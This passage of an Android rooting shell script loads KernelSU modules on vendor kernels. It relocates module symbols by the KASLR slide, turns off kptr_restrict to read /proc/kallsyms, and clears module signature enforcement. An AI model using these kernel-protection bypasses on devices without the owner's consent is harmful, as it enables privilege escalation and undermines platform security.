            mv /data/local/tmp/ksu "/data/local/tmp/ksu.legacy-${_kb:-boot}" 2>/dev/null || \
                rm -rf /data/local/tmp/ksu
            ln -sfn "$K6" /data/local/tmp/ksu 2>/dev/null
        fi
        _m6link=$(readlink /data/local/tmp/ksu 2>/dev/null || echo '?')
        echo "98260_KSU_M6_LINK=$_m6link"
        for _x in ksu_loader.sh load_ko ko_patch2 ksud_resukisu ksud_success \
                  su_forward su_optional.sh su_overlay_helper post_root.sh \
                  poison_trap.sh ksu_probe.sh magiskpolicy; do
            [ -f "$K6/$_x" ] && chmod 755 "$K6/$_x" 2>/dev/null
        done
        _mp=${MAGICROOT_KSU_PKG:-}
        if [ -z "$_mp" ]; then
            case "$KSU_FLAVOR_LOCAL" in
                kernelsu) _mp=me.weishu.kernelsu ;;
                next) _mp=com.rifsxd.ksunext ;;
                sukisu) _mp=com.sukisu.ultra ;;
                fina) _mp=me.yuki.fina ;;
                nova) _mp=com.sukisu.nova ;;
                maplesu) _mp=dev.maplesu.manager ;;
                *) _mp=com.resukisu.resukisu ;;
            esac
        fi
        if [ -n "$_mp" ] \
                && pm list packages 2>/dev/null | /system/bin/grep -qx "package:$_mp"; then
            printf '%s' "$_mp" > "$K6/MANAGER_PKG"
            echo "98260_KSU_M6_MANAGER=$_mp"
        else
            echo "98260_KSU_M6_MANAGER=skipped reason=selected_manager_not_installed flavor=$KSU_FLAVOR_LOCAL"
        fi
        if [ "$_m6link" != "$K6" ]; then
            echo "98260_KSU=failed method=m6-loader-6157 reason=link_failed path=/data/local/tmp/ksu target=$_m6link"
        else
            echo "98260_KSU_M6_BEGIN at=$(date '+%H:%M:%S' 2>/dev/null)"
            sync
            nohup "$SU" -c "cd $K6 && KSU_ACTIVATE=$K6/ksu_loader.sh sh $K6/ksu_loader.sh" \
                >> "$KSU_LOG" 2>&1 &
            KSU_M6_PID=$!
            KSU_OK=0
            _i=0
            _kl=0
            while [ "$_i" -lt 300 ]; do
                if ksu_live; then KSU_OK=1; break; fi
                if [ -x /data/adb/ksu/bin/su ] &&
                   [ "$(/data/adb/ksu/bin/su -c 'id -u' 2>/dev/null | tr -d ' \r\n')" = "0" ]; then
                    KSU_OK=1; break
                fi
                if [ -s "$K6/ksu_load.log" ]; then
                    _kn=$(wc -l < "$K6/ksu_load.log" 2>/dev/null | tr -d ' \r\n')
                    case "$_kn" in ''|*[!0-9]*) _kn=0 ;; esac
                    if [ "$_kn" -gt "$_kl" ]; then
                        tail -n +$((_kl + 1)) "$K6/ksu_load.log" 2>/dev/null | sed 's/^/M6| /'
                        _kl=$_kn
                    fi
                fi
                sleep 1
                _i=$((_i + 1))
            done
            sig_restore_6157
            _m6stamp=$(date '+%m%d-%H%M%S' 2>/dev/null)
            for _f in ksu_load.log ksu_stage.log ksu_install.log loadko_result.log; do
                [ -s "$K6/$_f" ] || continue
                _dst="/sdcard/cccodroid/magicroot/m6-${_f%.log}-${_m6stamp:-run}.log"
                mkdir -p /sdcard/cccodroid/magicroot 2>/dev/null || true
                cp -f "$K6/$_f" "$_dst" 2>/dev/null && echo "98260_KSU_M6_LOG_COPY=$_dst"
            done
            if [ "$KSU_OK" = "1" ]; then
                KSUD=$K6/ksud
                KSU_METHOD=m6-loader-6157
                KSU6157_OK=1
                echo "98260_KSU=loaded method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL sig_enforce=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null | tr -d ' \r\n')"
            else
                echo "98260_KSU=failed method=m6-loader-6157 waited=${_i}s log=$KSU_LOG m6log=$K6/ksu_load.log"
                tail -n 80 "$K6/ksu_load.log" 2>/dev/null || true
            fi
        fi
    elif [ "$PROFILE_LOCAL" = "6157" ] && [ "$G7D" = "1" ]; then
        echo "98260_KSU=failed method=m6-loader-6157 reason=assets_missing dir=$D/ksu6157-m6"
        sig_restore_6157
    elif [ "$PROFILE_LOCAL" = "6157" ] && [ "$G7D" != "1" ] && \
         { [ "$KSU_HANDOFF_LEGACY" != "1" ] || [ "$MANAGER_KO_OK" != "1" ]; } && \
         [ -f "$G264_BASE" ] && [ -x "$D/g264/ko_slide_patch" ]; then
        # ------------------------------------------------------------------
        # 6.1.x CGA 复刻模块（g264 起，含 g7d / 6.1.99 / 6.1.128 适配版）：
        #   · base.ko 是 PC 上以 slide=0 链好的 CGA 模块；
        #   · ko_slide_patch 把 symtab 的 SHN_ABS 值和 .text.ksustub 跳板
        #     字面量加上本 boot slide（与 PC 现编版逐 section 比对一致）；
        #   · 模块 late-load 后会切 SELinux enforcing，rootd 被切断；
        #     后续 su 走 ksud debug su（KSU_IOCTL_GRANT_ROOT），不依赖 sucompat。
        # ------------------------------------------------------------------
        : > "$KSU_LOG" 2>/dev/null || true
        _expect_abs=225
        _expect_stubs=220
        case "${G264_BASE##*/}" in
            ksm-g264-base.ko|ksm-gaaa-base.ko)
                _expect_abs=226
                _expect_stubs=221
                ;;
        esac
        echo "98260_KSU_BACKEND=g264-cga kernel=$KERNEL slide=${SLIDE:-?} sig_before=${SIG_ORIG:-?}" | tee -a "$KSU_LOG"
        echo "98260_KSU_EXPECT_COUNTS abs=$_expect_abs stubs=$_expect_stubs profile=$KERNEL"
        _base=$G264_BASE
        _ko=$G264_KO
        _patch_out=""
        if [ -z "${SLIDE:-}" ]; then
            echo "98260_KSU=failed reason=no_slide"
        else
            _patch_out=$("$D/g264/ko_slide_patch" "$_base" "$_ko" "$SLIDE" 2>&1)
            echo "$_patch_out" | tee -a "$KSU_LOG"
            case "$_patch_out" in
                *abs_symbols=*) : ;;
                *) _patch_out="" ;;
            esac
            if [ -n "$_patch_out" ]; then
                _patch_abs=$(printf '%s\n' "$_patch_out" | sed -n 's/.*abs_symbols=\([0-9]*\).*/\1/p' | tail -1)
                _patch_stubs=$(printf '%s\n' "$_patch_out" | sed -n 's/.*stub_quads=\([0-9]*\).*/\1/p' | tail -1)
                _base_size=$(stat -c%s "$_base" 2>/dev/null)
                _ko_size=$(stat -c%s "$_ko" 2>/dev/null)
                if [ "$_patch_abs" != "$_expect_abs" ] || [ "$_patch_stubs" != "$_expect_stubs" ] \
                        || [ -z "$_ko_size" ] || [ "$_ko_size" != "$_base_size" ]; then
                    echo "98260_G264_PATCH_INVALID abs=${_patch_abs:-?} stubs=${_patch_stubs:-?} size=${_ko_size:-?}/${_base_size:-?}"
                    _patch_out=""
                fi
            fi
        fi
        if [ -n "$_patch_out" ]; then
            _pk_patch=$(printf '%s\n' "$_patch_out" | sed -n 's/.*_printk=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1)
            _pk_dev=$(timeout 10 "$SU" -c 'echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; grep -w _printk /proc/kallsyms' 2>/dev/null | awk '{print "0x"$1; exit}')
            case "$_pk_dev" in
                ""|0x|0x0|0x0000000000000000) _pk_dev="" ;;
            esac
            if [ -n "$_pk_dev" ] && [ -n "$_pk_patch" ] && [ "$_pk_patch" != "$_pk_dev" ]; then
                echo "98260_KSU=failed reason=patch_printk_mismatch patch=$_pk_patch dev=$_pk_dev"
            else
                _ko_sha=$(sha256sum "$_ko" 2>/dev/null | awk '{print $1}')
                echo "98260_G264_KO=$_ko size=$(stat -c%s "$_ko" 2>/dev/null) sha256=${_ko_sha:-?} printk=${_pk_patch:-?}/${_pk_dev:-unknown}"
                # STP compat: disable su_compat at load time, not after the LKM
                # is already live.  force_feature is a module parameter parsed
                # by ksu_feature_init(); it cannot be re-enabled by userspace.
                _insmod_args="allow_shell=1"
                if [ "$SU_COMPAT_98260" = "0" ]; then
                    _insmod_args="$_insmod_args force_feature=su_compat:0"
                    echo "98260_KSU_FORCE_FEATURE=su_compat:0 source=insmod"
                fi
                _insmod_timeout=$(num_or "${MAGICROOT_6157_INSMOD_TIMEOUT:-}" 60)
                echo "98260_G264_INSMOD_BEGIN timeout=$_insmod_timeout"
                timeout "$_insmod_timeout" "$SU" -c "insmod $_ko $_insmod_args" >> "$KSU_LOG" 2>&1
                _ins_rc=$?
                echo "98260_G264_INSMOD_END rc=$_ins_rc"
                sleep 2
                if [ -d /sys/module/kernelsu ]; then
                    KSU_OK=1
                    # sysfs proves the LKM is live, but the selected manager's
                    # ksud must still answer its driver ioctl.  Probe it once so
                    # setup/install do not run through an incompatible fork.
                    _ksud_sel=${KSUD_MANAGER:-$D/ksu6157-g264/ksud}
                    if [ -x "$_ksud_sel" ]; then
                        _probe_mgr=$(echo id | timeout 10 "$_ksud_sel" debug su 2>/dev/null | tr -d '\r')
                        case "$_probe_mgr" in
                            *uid=0*) ;;
                            *)
                                if [ -x "$D/ksu6157-g264/ksud" ] && [ "$_ksud_sel" != "$D/ksu6157-g264/ksud" ]; then
                                    echo "98260_KSUD_MANAGER_PROBE=failed path=$_ksud_sel fallback=bundled reason=sysfs_live"
                                    _ksud_sel=$D/ksu6157-g264/ksud
                                fi ;;
                        esac
                    fi
                else
                    # shell 读不了 /proc/modules；用 ksud 的驱动通道再探一次。
                    # 先试当前管理器提取的 ksud，再退回内置 g264 ksud。
                    _probe=""
                    _ksud_sel=${KSUD_MANAGER:-$D/ksu6157-g264/ksud}
                    if [ -x "$_ksud_sel" ]; then
                        _probe=$(echo id | timeout 10 "$_ksud_sel" debug su 2>/dev/null | tr -d '\r')
                    fi
                    case "$_probe" in
                        *uid=0*) KSU_OK=1 ;;
                        *)
                            if [ -x "$D/ksu6157-g264/ksud" ] && [ "$_ksud_sel" != "$D/ksu6157-g264/ksud" ]; then
                                echo "98260_KSUD_MANAGER_PROBE=failed path=$_ksud_sel fallback=bundled"
                                _ksud_sel=$D/ksu6157-g264/ksud
                                _probe=$(echo id | timeout 10 "$_ksud_sel" debug su 2>/dev/null | tr -d '\r')
                                case "$_probe" in *uid=0*) KSU_OK=1 ;; *) KSU_OK=0 ;; esac
                            else
                                KSU_OK=0
                            fi ;;
                    esac
                fi
                if [ "$KSU_OK" = "1" ]; then
                    KSU_METHOD=g264-cga
                    KSU6157_OK=1
                    [ -x "${_ksud_sel:-}" ] || _ksud_sel=${KSUD_MANAGER:-$D/ksu6157-g264/ksud}
                    [ -x "$_ksud_sel" ] || _ksud_sel=$D/ksu6157-g264/ksud
                    KSUD=$_ksud_sel
                    echo "98260_KSU=loaded method=g264-cga insmod_rc=$_ins_rc ksud=$KSUD source=${KSUD_MANAGER_SOURCE:-bundled} flavor=$KSU_FLAVOR_LOCAL"
                    if [ "$SU_COMPAT_98260" = "0" ]; then
                        # STP compat intentionally disables both su_compat and the
                        # userspace su overlay.  Do not run su_optional.sh: it
                        # would call `feature set su_compat 1` and undo the
                        # load-time force_feature.
                        echo "98260_SU_SETUP=skipped reason=su_compat_off_load_time"
                    elif [ -x "$KSUD" ] && [ -f "$D/su-g264/setup_su_app.sh" ]; then
                        echo "98260_SU_SETUP_BEGIN ksud=$KSUD"
                        _su_setup_log=$D/98260-su-setup.log
                        : > "$_su_setup_log" 2>/dev/null || true
                        echo "sh $D/su-g264/setup_su_app.sh '$KSUD' '1'" \
                            | timeout 45 "$KSUD" debug su >> "$_su_setup_log" 2>&1
                        SU_SETUP_RC=$?
                        cat "$_su_setup_log" 2>/dev/null | tee -a "$KSU_LOG"
                        echo "98260_SU_SETUP_RC=$SU_SETUP_RC"
                    fi
                    # Open only the manager selected for this run.  Falling
                    # through to whichever KSU fork happens to be installed
                    # can leave the user granting root in the wrong app.
                    _mgr_pkg=${MAGICROOT_KSU_PKG:-}
                    if [ -z "$_mgr_pkg" ]; then
                        case "$KSU_FLAVOR_LOCAL" in
                            kernelsu) _mgr_pkg=me.weishu.kernelsu ;;
                            next) _mgr_pkg=com.rifsxd.ksunext ;;
                            sukisu) _mgr_pkg=com.sukisu.ultra ;;
                            fina) _mgr_pkg=me.yuki.fina ;;
                            nova) _mgr_pkg=com.sukisu.nova ;;
                            maplesu) _mgr_pkg=dev.maplesu.manager ;;
                            *) _mgr_pkg=com.resukisu.resukisu ;;
                        esac
                    fi
                    if [ -n "$_mgr_pkg" ] \
                            && pm list packages 2>/dev/null | /system/bin/grep -qx "package:$_mgr_pkg"; then
                        am force-stop "$_mgr_pkg" >/dev/null 2>&1
                        monkey -p "$_mgr_pkg" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
                        echo "98260_KSU_MANAGER_OPENED=$_mgr_pkg"
                    else
                        echo "98260_KSU_MANAGER_OPEN=skipped reason=selected_manager_not_installed flavor=$KSU_FLAVOR_LOCAL"
                    fi
                else
                    echo "98260_KSU=failed method=g264-cga insmod_rc=$_ins_rc"
                    tail -n 40 "$KSU_LOG" 2>/dev/null || true
                fi
            fi
        fi
    elif [ "$PROFILE_LOCAL" = "6157" ] && [ "$KSU_HANDOFF_LEGACY" = "1" ] && \
         [ -x "$KSU6157_DIR/ksu-loader" ]; then
        # ------------------------------------------------------------------
        # 6.1.x 专版交接（ksu_prepare + ksu-loader）
        #   1) rootd（SELinux Permissive）按本 boot 的 KASLR slide，把 LKM 的
        #      每个未定义符号重定位成绝对地址（供应商内核把 commit_creds
        #      从 kallsyms 藏了，模块自己解析不到它）；
        #   2) 同一进程 init_module，成功后直接 exec ksud late-load；
        #   3) init_module 一结束——成功或失败——立刻把 sig_enforce 写回 1。
        # 模板优先使用 App 从当前管理器 APK 提取且 vermagic 精确匹配的 LKM；
        # 否则退回荣耀专用 kernelsu-honor.ko。
        # ------------------------------------------------------------------
        KDIR=$KSU6157_DIR
        : > "$KSU_LOG" 2>/dev/null || true
        _MANAGER_TEMPLATE=$KDIR/kernelsu-honor.ko
        if [ "$MANAGER_KO_OK" = "1" ] && [ -f "$MANAGER_KO" ]; then
            _MANAGER_TEMPLATE=$MANAGER_KO
            echo "98260_KSU_TEMPLATE=$_MANAGER_TEMPLATE source=manager-apk flavor=$KSU_FLAVOR_LOCAL" | tee -a "$KSU_LOG"
        else
            echo "98260_KSU_TEMPLATE=$_MANAGER_TEMPLATE source=bundled" | tee -a "$KSU_LOG"
        fi
        BOOT_TAG=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | cut -c1-8)
        RUNTIME_KO=$KDIR/runtime-${BOOT_TAG:-boot}.ko
        rm -f "$RUNTIME_KO" 2>/dev/null || true
        _vm=$(grep -a -o 'vermagic=[^ ]*' "$_MANAGER_TEMPLATE" 2>/dev/null | head -1)
        echo "98260_KSU_HANDOFF=6157 ${_vm:-vermagic=?} expected=$KERNEL sig_before=${SIG_ORIG:-?} will_clear=$SIG_WANT" | tee -a "$KSU_LOG"
        {
          echo "HANDOFF_DIAG su=$SU uid=$(id -u 2>/dev/null) getenforce=$(getenforce 2>/dev/null)"
          echo "HANDOFF_DIAG rootd=$SOCK sock_exists=$([ -S "$SOCK" ] && echo yes || echo no)"
          echo "HANDOFF_DIAG sig_sysfs=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null | tr -d ' \r\n')"
          echo "HANDOFF_DIAG modules=$(grep -c kernelsu /proc/modules 2>/dev/null || echo unreadable)"
        } | tee -a "$KSU_LOG"
        # prepare 的输出以前只写 KSU_LOG，主日志里看不到；一旦这一步出事，日志就停在
        # HANDOFF_DIAG 上，无法判断是 prepare 没跑完还是模块没载入。现在同时进主日志。
        echo "98260_PREPARE_BEGIN su=$SU at=$(date '+%H:%M:%S' 2>/dev/null)"
        sync
        # ---- 2026-10-31 12:11 那次真机日志：reboot 恰好落在 PREPARE_BEGIN 之后，
        #      ksu_prepare 一个字都没输出（它的 stderr 是无缓冲的，说明它连 main
        #      里的错误分支都没走到，或者还没起来系统就没了）。这里把 ksu_prepare
        #      内部要做的事用 shell 逐步拆开，每步都落到直写 /sdcard 的主日志里：
        #      下次重启后，看最后一条 98260_PROBE_END 就知道崩在哪一步。
        _probe() {
            _pn=$1; shift
            echo "98260_PROBE_BEGIN=$_pn at=$(date '+%H:%M:%S' 2>/dev/null)"
            _po=$("$SU" -c "$*" 2>&1; echo "RC=$?")
            echo "98260_PROBE_END=$_pn out=[$(printf '%s' "$_po" | tr '\n' '|' | cut -c1-400)]"
            sync
        }
        _probe id 'id'
        _probe cap 'grep -E "^(Uid|CapEff|CapPrm)" /proc/self/status'
        _probe kptr 'cat /proc/sys/kernel/kptr_restrict'
        _probe kallsyms_wc 'wc -l /proc/kallsyms'
        _probe kallsyms_head 'head -3 /proc/kallsyms'
        _probe files "ls -l $_MANAGER_TEMPLATE $KDIR/ksu-syms.txt"
        # 心跳：prepare 期间每 2 秒一行。重启后看最后一条 t=Ns，就知道它活了多久。
        ( _t=0; while :; do sleep 2; _t=$((_t + 2));
          echo "98260_ALIVE prepare t=${_t}s at=$(date '+%H:%M:%S' 2>/dev/null)"; done ) & HB=$!
        "$SU" -c "!$KDIR/ksu_prepare $_MANAGER_TEMPLATE $KDIR/ksu-syms.txt $RUNTIME_KO" 2>&1 | tee -a "$KSU_LOG"
        _prc=$?
        kill $HB 2>/dev/null
        echo "98260_PREPARE_END rc=$_prc size=$(stat -c%s "$RUNTIME_KO" 2>/dev/null || echo 0) at=$(date '+%H:%M:%S' 2>/dev/null)"
        sync
        if [ ! -s "$RUNTIME_KO" ] || ! grep -q '^\[prepare\] ok' "$KSU_LOG" 2>/dev/null; then
            echo "98260_KSU=failed reason=prepare log=$KSU_LOG"
            tail -n 40 "$KSU_LOG" 2>/dev/null || true
            sig_restore_6157
        else
            _restore_arg=""
            # 实机验证过的原版 ksu-loader（1,022,432 B）只接受 <module> <ksud> 两个参数，
            # 多给一个 --restore-sig 会按 argc!=3 直接退出；签名强制留到模块接管、
            # ksud 起来之后由本脚本的 sig_restore_6157 处理。只有自编的小 loader 认这个参数。
            _ld_size=$(stat -c%s "$KDIR/ksu-loader" 2>/dev/null || echo 0)
            # 注意：g264 线上用的是自编 loader（2,141,648 B），它**认** --restore-sig；
            # 只有参考包那个原版恰好吃 2 个参数，所以按精确大小判断，不能按 <100000。
            if [ "$SIG_WANT" = "1" ] && [ "${_ld_size:-0}" != "1022432" ]; then
                _restore_arg="--restore-sig"
            fi
            # 2026-10-31 13:28 真机：init_module 挂住之后，这个 shell **连
            # /system/bin/tr 这种绝对路径都 exec 不了**（mksh 报 inaccessible or
            # not found），所以挂住以后再想跑 dmesg/tail 都是白搭。改成：
            #   1) 进 init_module 之前先把历史 dmesg 抓下来；
            #   2) 起一个 dmesg -w 常驻跟随，内核一旦报 hung task/BUG 就直接进主日志；
            #   3) 等待循环只用 shell 内建（read / test），不 fork 任何东西。
            echo "98260_DMESG_PRE_BEGIN at=$(date '+%H:%M:%S' 2>/dev/null)"
            "$SU" -c "dmesg | tail -120" 2>&1
            echo "98260_DMESG_PRE_END"
            # 跟随内核日志，但**不能**让 dmesg -w 自己占着 rootd（rootd 一次只服务
            # 一个连接，dmesg -w 是常驻的，会把后面的 loader 挡在外面）。内层 nohup
            # 让它脱离，sh 立即退出、rootd 立即释放；输出落文件，等待循环用纯内建
            # read 转发进主日志。
            : > "$D/dmesg-live.log" 2>/dev/null || true
            "$SU" -c "dmesg -c >/dev/null 2>&1; nohup dmesg -w >> $D/dmesg-live.log 2>&1 &" 2>&1
            echo "98260_DMESG_FOLLOW=started"
            echo "98260_KSU_LOADING=1 restore_sig=$SIG_WANT module=$RUNTIME_KO" | tee -a "$KSU_LOG"
            # 参考包（实机跑通）的启动方式：su -c "nohup ksu-loader <模块> <ksud> &"。
            # rootd 是串行服务（handle_client 里 fork 后 waitpid），我们原来用 '!'
            # 直接 exec loader，这个连接会一直被占着（loader 又 exec 成长期运行的
            # ksud），于是之后每一次 $SU 调用——ksu_live、dmesg —— 全都排在这条连接
            # 后面阻塞。改成内层 nohup 后台化：sh 立刻退出，rootd 立刻释放。
            _ksud_sel=${KSUD_MANAGER:-$KDIR/ksud}
            [ -x "$_ksud_sel" ] || _ksud_sel=$KDIR/ksud
            echo "98260_KSU_LOADER_KSUD=$_ksud_sel source=${KSUD_MANAGER_SOURCE:-bundled}" | tee -a "$KSU_LOG"
            "$SU" -c "nohup $KDIR/ksu-loader $RUNTIME_KO $_ksud_sel $_restore_arg < /dev/null >> $KSU_LOG 2>&1 &" 2>&1
            echo "98260_KSU_LAUNCHED rc=$?"
            KSU_OK=0
            _i=0
            _kl=0
            _exec_ok=1
            _sysfs_seen=0
            _dlk=0
            # 纯内建的一秒延时：exec 坏掉之后 /system/bin/sleep 也起不来，但
            # read /proc/uptime + 参数展开都是 shell 自己的，仍然可用。
            _bsleep() {
                read -r _u0 _r0 < /proc/uptime 2>/dev/null || return 1
                _e0=$(( ${_u0%%.*} + $1 ))
                while :; do
                    read -r _u1 _r1 < /proc/uptime 2>/dev/null || return 1
                    [ "${_u1%%.*}" -ge "$_e0" ] && return 0
                done
            }
            _mods_has_ksu() {
                while read -r _ml _mr; do
                    case "$_ml" in kernelsu*) return 0 ;; esac
                done < /proc/modules 2>/dev/null
                return 1
            }
            while [ "$_i" -lt 150 ]; do
                if _mods_has_ksu; then
                    KSU_OK=1
                    break
                fi
                if [ -x /data/adb/ksu/bin/su ]; then
                    _k0=$(/data/adb/ksu/bin/su -c 'id -u' 2>/dev/null)
                    case "$_k0" in *0*) KSU_OK=1; break ;; esac
                fi
                # 模块一旦进入 init，sysfs 条目会先出现（即使 init 还没返回）。
                if [ "$_sysfs_seen" = 0 ] && [ -d /sys/module/kernelsu ]; then
                    _sysfs_seen=1
                    echo "98260_MOD_SYSFS=present t=${_i}s (init 已进入，尚未返回)"
                fi
                if [ -s "$KSU_LOG" ]; then
                    # 纯内建转发：read + echo，不依赖 wc/tail/sed —— 这三个在
                    # init_module 挂住后全部 exec 失败。
                    _kc=0
                    while IFS= read -r _line; do
                        _kc=$((_kc + 1))
                        [ "$_kc" -le "$_kl" ] && continue
                        echo "KSU| $_line"
                    done < "$KSU_LOG"
                    _kl=$_kc
                fi
                # 内核日志同样用纯内建转发（dmesg -w 写到 dmesg-live.log）。
                if [ -s "$D/dmesg-live.log" ]; then
                    _dc=0
                    while IFS= read -r _dl; do
                        _dc=$((_dc + 1))
                        [ "$_dc" -le "$_dlk" ] && continue
                        echo "DMESG| $_dl"
                    done < "$D/dmesg-live.log"
                    _dlk=$_dc
                fi
                case "$_i" in
                  30|60|90|130)
                    echo "98260_LOAD_PROBE t=${_i}s sysfs=$([ -d /sys/module/kernelsu ] && echo yes || echo no) exec_ok=$_exec_ok"
                    ;;
                esac
                if [ "$_exec_ok" = 1 ]; then
                    [ -x /system/bin/sleep ] && /system/bin/sleep 1 || _exec_ok=0
                    [ "$_exec_ok" = 1 ] || echo "98260_EXEC_BROKEN=1 t=${_i}s (init_module 之后无法 exec)"
                else
                    _bsleep 1 || break
                fi
                _i=$((_i + 1))
            done
            # 正常情况下 ksu-loader 已在 init_module 之后写回；这里再确认一次，
            # 覆盖 loader 被 SELinux 挡下写 sysfs 的情形。
            sig_restore_6157
            if [ "$KSU_OK" = "1" ]; then
                KSUD=$_ksud_sel
                KSU_METHOD=ksu-loader-6157
                KSU6157_OK=1
                echo "98260_KSU=loaded method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL sig_enforce=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null | tr -d ' \r\n')"
            else
                echo "98260_KSU=failed method=ksu-loader-6157 waited=${_i}s log=$KSU_LOG"
                {
                    echo "HANDOFF_DIAG ksu_module_loaded=$(grep -c '^kernelsu ' /proc/modules 2>/dev/null || echo unreadable)"
                    echo "HANDOFF_DIAG ksu_su=$([ -x /data/adb/ksu/bin/su ] && echo present || echo absent)"
                    echo "HANDOFF_DIAG real_uid_status=$(sed -n 's/^Uid:[[:space:]]*//p' /proc/self/status 2>/dev/null)"
                    echo "HANDOFF_DIAG sig_now=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null | tr -d ' \r\n')"
                } | tee -a "$KSU_LOG"
                # 内核拒绝模块的原因（EKEYREJECTED / vermagic / unknown symbol）
                # 只会写在 dmesg，不在 init_module 的返回值里。
                "$SU" -c "dmesg | tail -60" >> "$KSU_LOG" 2>&1
                tail -n 80 "$KSU_LOG" 2>/dev/null || true
            fi
        fi
    elif [ "$PROFILE_LOCAL" = "6157" ]; then
        # Never fall through to 6.12/6.6 ko_patch fallbacks.  For every
        # non-g7d 6.1.x build the only accepted KSU input is its own remapped
        # CGA base; a missing/stale deployment must fail, not borrow g264 or
        # another kernel's absolute symbols.
        echo "98260_KSU=failed reason=6157_handoff_unavailable kernel=$KERNEL cga_base=$G264_BASE ksud_dir=$KSU6157_DIR"
        sig_restore_6157
    elif [ -z "$SLIDE" ] || [ -z "$KO_TEMPLATE" ] || [ ! -f "$KO_TEMPLATE" ] || [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$D/ko_patch" ]; then
        echo "98260_KSU=skipped reason=patch_inputs_missing flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL"
    else
        PATCHED=$D/98260/ksu-patched.ko
        : > "$KSU_LOG" 2>/dev/null || true
        "$D/ko_patch" "$KO_TEMPLATE" "$PATCHED" "$SYMS" "$SLIDE" "$KERNEL" >> "$KSU_LOG" 2>&1
        PATCH_RC=$?
        PATCH_LINE=$(grep -m1 '^PATCHED=' "$KSU_LOG" 2>/dev/null)
        KSU_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
        echo "98260_KSU_PATCH_RC=$PATCH_RC missing=${KSU_MISSING:-none} flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL template=$(basename "$KO_TEMPLATE")" | tee -a "$KSU_LOG"
        # A manager-carved KMI module can be a different KSU build (or a
        # 6.6/6.18 module if KMI probing missed).  Never let it regress the
        # verified chain: if symbol resolution is incomplete, retry once with
        # the bundled per-flavor template.
        if { [ "$PATCH_RC" != "0" ] || [ "${KSU_MISSING:-1}" != "0" ] || [ ! -f "$PATCHED" ]; } &&
           [ "$(basename "$KO_TEMPLATE")" = "ko-$KSU_FLAVOR_LOCAL.ko" ]; then
            _fb="$D/ksu-template-$KSU_FLAVOR_LOCAL.ko"
            [ -f "$_fb" ] || _fb="$D/ksu-template.ko"
            if [ -f "$_fb" ]; then
                echo "98260_MANAGER_KO_FALLBACK=1 from=$(basename "$KO_TEMPLATE") to=$(basename "$_fb") reason=missing_symbols_or_patch_rc"
                "$D/ko_patch" "$_fb" "$PATCHED" "$SYMS" "$SLIDE" "$KERNEL" >> "$KSU_LOG" 2>&1
                PATCH_RC=$?
                # Use the LAST PATCHED line: the log was appended by the
                # failed manager-module attempt above.
                PATCH_LINE=$(grep '^PATCHED=' "$KSU_LOG" 2>/dev/null | tail -1)
                KSU_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
                KO_TEMPLATE="$_fb"
                echo "98260_KSU_PATCH_RETRY=$PATCH_RC missing=${KSU_MISSING:-none} template=$(basename "$KO_TEMPLATE")" | tee -a "$KSU_LOG"
            fi
        fi
        if [ "$PATCH_RC" != "0" ] || [ "${KSU_MISSING:-1}" != "0" ] || [ ! -f "$PATCHED" ]; then
            echo "98260_KSU=failed reason=ko_patch log=$KSU_LOG"
        elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
            echo "98260_KSU=failed reason=vermagic_target_mismatch expected=$KERNEL line=$PATCH_LINE"
        else
            KSUD=""
            if [ -x "$D/ksud_$KSU_FLAVOR_LOCAL" ]; then
                KSUD="$D/ksud_$KSU_FLAVOR_LOCAL"
                echo "98260_KSUD=selected-manager flavor=$KSU_FLAVOR_LOCAL path=$KSUD"
            elif [ -x "$D/ksud" ]; then
                KSUD=$D/ksud
                echo "98260_KSUD=workdir-fallback path=$KSUD"
            else
                KSUD=/data/adb/ksud
                echo "98260_KSUD=system-fallback path=$KSUD"
            fi
            # Preinstall userspace while rootd is still reachable; KSU LKM
            # load returns SELinux to Enforcing and the rootd client can be denied.
            if [ -n "$KSUD" ] && [ -x "$KSUD" ] && [ -f "$D/libadbroot.so" ]; then
                # Matches the verified g554 test: the manager-embedded libksud
                # needs LD_LIBRARY_PATH=$D for its bundled libadbroot dependency.
                printf 'export LD_LIBRARY_PATH="%s"; "%s" install --libadbroot "%s" --data-path /data/adb\n' \
                    "$D" "$KSUD" "$D/libadbroot.so" | "$SU" >> "$KSU_LOG" 2>&1
                echo "98260_KSU_PREINSTALL_RC=$?" | tee -a "$KSU_LOG"
            fi
            KSU_METHOD=""
            KSU_ALLOW_ARG=""
            [ "$ALLOW_SHELL_98260" = "1" ] && KSU_ALLOW_ARG=" --allow-shell"
            # Verified-test primary path: use the manager's own libksud and
            # late-load its matching 6.6 LKM.  Only if this fails do we fall
            # back to patched-KO late-load / insmod.
            if [ -n "$KSUD" ] && [ -x "$KSUD" ]; then
                echo "98260_KSU_LATELOAD_PRIMARY_BEGIN kmi=$KMI"
                _primary_params=""
                [ "$ALLOW_SHELL_98260" = "1" ] && _primary_params="allow_shell=1"
                [ "$SU_COMPAT_98260" = "0" ] && _primary_params="force_feature=su_compat:0${_primary_params:+ $_primary_params}"
                printf 'export LD_LIBRARY_PATH="%s"; "%s" insmod "%s" %s\n' \
                    "$D" "$KSUD" "$PATCHED" "$_primary_params" | "$SU" >> "$KSU_LOG" 2>&1
                echo "98260_INIT_CRED_PRIMARY_INSMOD_RC=$?" | tee -a "$KSU_LOG"
                if ksu_live; then
                    printf 'export LD_LIBRARY_PATH="%s"; "%s" late-load --kmi "%s" --package-name "%s"%s\n' \
                        "$D" "$KSUD" "$KMI" "$MGR" "$KSU_ALLOW_ARG" | "$SU" >> "$KSU_LOG" 2>&1
                    _primary_ll_rc=$?
